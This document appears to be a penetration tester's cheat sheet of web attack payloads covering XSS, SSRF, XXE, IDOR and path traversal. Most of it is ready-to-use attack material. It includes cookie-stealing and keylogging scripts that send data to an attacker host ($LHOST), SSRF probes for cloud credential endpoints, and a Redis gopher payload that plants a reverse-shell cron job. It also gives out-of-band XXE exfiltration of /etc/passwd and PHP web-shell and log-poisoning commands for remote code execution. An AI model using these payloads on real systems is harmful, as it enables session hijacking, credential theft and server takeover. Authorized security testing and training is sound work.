# Web Attacks — XSS / SSRF / XXE / IDOR

**Tags:** #xss #ssrf #xxe #idor #web #exploitation
**Phase:** Recon → Exploitation

---

## 1. XSS (Cross-Site Scripting)

### 1.1 Detection

```html
<!-- Polyglot — tests all XSS contexts -->
'"><img src=x onerror=alert(1)>//
javascript:alert(1)
{{7*7}}
${7*7}
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
" onmouseover="alert(1)
'><svg onload=alert(1)>
```

### 1.2 Reflected XSS

```html
<!-- URL parameter → search?q=XSS_PAYLOAD -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

### 1.3 Stored XSS

```html
<!-- In comments, profiles, messages — executes for every viewer -->
<script>document.location='http://$LHOST/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://$LHOST/steal?c='+document.cookie)">
<svg><script>fetch('http://$LHOST/?c='+document.cookie)</script></svg>
```

### 1.4 DOM-Based XSS

```javascript
// Dangerous sinks: innerHTML, document.write, eval, location.href
// Test: add #<script>alert(1)</script> to URL
// Source: location.hash, location.search, document.referrer
```

### 1.5 Cookie Theft Payload

```html
<!-- Listener on Kali -->
nc -lvnp 8080
python3 -m http.server 8080

<!-- Payload -->
<script>new Image().src='http://$LHOST:8080/steal?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('http://$LHOST:8080/steal?c='+btoa(document.cookie))</script>
```

### 1.6 Keylogger

```javascript
<script>
document.onkeypress = function(e) {
  fetch('http://$LHOST:8080/?k='+e.key);
}
</script>
```

### 1.7 Filter Bypass

```html
<!-- Script tag filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">

<!-- On* filtered -->
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><input type=submit>

<!-- Quotes filtered -->
<img src=x onerror=alert(1)>    <!-- no quotes needed -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- base64: alert(1) -->

<!-- Alert filtered -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(document.domain)</script>

<!-- Case bypass -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=X ONERROR=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg/onload='alert(1)'>
```

---

## 2. SSRF (Server-Side Request Forgery)

### 2.1 Detection

```bash
# Look for parameters that accept URLs
url=, path=, file=, host=, page=, src=, dest=, redirect=, uri=, link=, domain=

# Basic SSRF test — ping back to your listener
url=http://$LHOST:8080/test

# Use Burp Collaborator or interactsh
url=http://XXXX.burpcollaborator.net
url=http://$(interactsh_url)
```

### 2.2 Internal Service Discovery

```bash
# Cloud metadata — ALWAYS try these
url=http://169.254.169.254/latest/meta-data/              # AWS
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://metadata.google.internal/computeMetadata/v1/    # GCP (+ Metadata-Flavor:Google header)
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure

# Internal network scan
url=http://127.0.0.1:22
url=http://127.0.0.1:80
url=http://127.0.0.1:3306
url=http://127.0.0.1:6379    # Redis
url=http://127.0.0.1:5432    # PostgreSQL
url=http://127.0.0.1:27017   # MongoDB
url=http://10.0.0.1/
url=http://192.168.1.1/
```

### 2.3 Filter Bypass

```bash
# Localhost bypass
url=http://localhost/
url=http://127.0.0.1/
url=http://[::1]/           # IPv6
url=http://127.1/           # Short form
url=http://0177.0.0.1/      # Octal
url=http://2130706433/      # Decimal IP
url=http://127.0.0.1.nip.io/

# DNS rebinding
url=http://attacker.com/    # DNS resolves to 127.0.0.1 after first request

# URL redirects
url=http://$LHOST:8080/redirect?url=http://169.254.169.254/

# Protocol abuse
url=file:///etc/passwd
url=dict://127.0.0.1:6379/info    # Redis
url=gopher://127.0.0.1:6379/...   # Redis RCE via gopher
url=ftp://127.0.0.1:21/
url=ldap://127.0.0.1:389/
```

### 2.4 Redis RCE via SSRF (Gopher)

```bash
# Write cron job via Redis
# Payload URL-encoded for gopher
url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A*/1*+*+*+*+bash+-i+>%26+/dev/tcp/$LHOST/4444+0>%261%0A%0A%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

---

## 3. XXE (XML External Entity Injection)

### 3.1 Basic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>

<!-- Windows -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]>
```

### 3.2 SSRF via XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://$LHOST:8080/xxe_test"> ]>
<root><data>&xxe;</data></root>

<!-- AWS metadata -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
```

### 3.3 Blind XXE — Out-of-Band Exfil

```xml
<!-- attacker's DTD file (hosted at http://$LHOST:8080/evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$LHOST:8080/?data=%file;'>">
%eval;
%exfil;

<!-- Payload sent to server -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://$LHOST:8080/evil.dtd"> %xxe; ]>
<root><data>test</data></root>
```

### 3.4 PHP Wrapper (Base64 read)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

### 3.5 Detection Points

```
Content-Type: application/xml
Content-Type: text/xml
SVG uploads (SVG is XML)
DOCX / XLSX file uploads (Office = XML inside ZIP)
SAML assertions
RSS/Atom feeds
```

---

## 4. IDOR (Insecure Direct Object References)

### 4.1 Detection

```bash
# Change IDs in any request
GET /api/user/1234 → /api/user/1235
GET /invoice/user/1234 → /api/user/1
POST /delete {"id": "1234"} → {"id": "1235"}

# UUID/GUID — harder but possible via enumeration or prediction
GET /api/files/550e8400-e29b-41d4-a716-446655440000

# Encoded IDs
base64 -d <<< "MTIzNA=="  # Might be 1234
# Modify + re-encode
```

### 4.2 Common IDOR Patterns

```bash
# Horizontal privilege escalation (access another user's data)
/api/account/1234/orders     → change to /api/account/1235/orders

# Vertical privilege escalation
/api/user/1234/role=admin    → add/modify role parameter

# Object parameter manipulation
POST /transfer {"from":"myacct","to":"theirs","amount":100}
POST /transfer {"from":"theirs","to":"myacct","amount":100}  # reverse transfer

# File path
/download?file=report_user_1234.pdf → /download?file=report_user_1235.pdf

# Check all HTTP methods
GET /api/user/1234/admin → 403
DELETE /api/user/1234/admin → 200?

# Blind IDOR (no response data visible — check side effects)
DELETE /api/post/1234  → "success" (even for another user's post)
```

### 4.3 Mass Assignment / Parameter Pollution

```bash
# Add privileged fields to registration/update
POST /register
{"username":"attacker","password":"pass","role":"admin"}

# HTTP Parameter Pollution
GET /page?id=1&id=2   # Some parsers use the last value
```

---

## 5. Path Traversal / LFI

### 5.1 Basic Traversal

```bash
# Linux
../../../etc/passwd
..././..././..././etc/passwd  # Double-encode bypass
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Windows
..\..\..\Windows\System32\drivers\etc\hosts
..%5c..%5c..%5c..%5cWindows\System32\drivers\etc\hosts

# PHP wrappers (LFI → RFI / data)
php://filter/convert.base64-encode/resource=../config.php
php://input   # POST body as PHP code
data://text/plain,<?php system($_GET['cmd']);?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### 5.2 LFI → RCE Techniques

```bash
# 1. Log poisoning (Apache/Nginx)
# Inject PHP into User-Agent: <?php system($_GET['cmd']); ?>
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# Then include log:
curl "http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ (if readable)
# Inject PHP in User-Agent, include:
?page=../../../../proc/self/environ&cmd=id

# 3. Session file inclusion (PHP)
# Set cookie with PHP code, include session file:
?page=../../../../var/lib/php/sessions/sess_SESSIONID

# 4. SSH log poisoning
ssh '<?php system($_GET["cmd"]);?>'@target.com
?page=../../../../var/log/auth.log&cmd=id

# 5. PHP pearcmd (Phar upload + include)
# Upload phar file as image, then include it
```

---

## Related Notes

- [[07-Web-Application/Web-Scanning]]
- [[07-Web-Application/File-Upload]]
- [[00-Quick-Reference/SSTI Payloads]]
- [[00-Quick-Reference/LFI]]
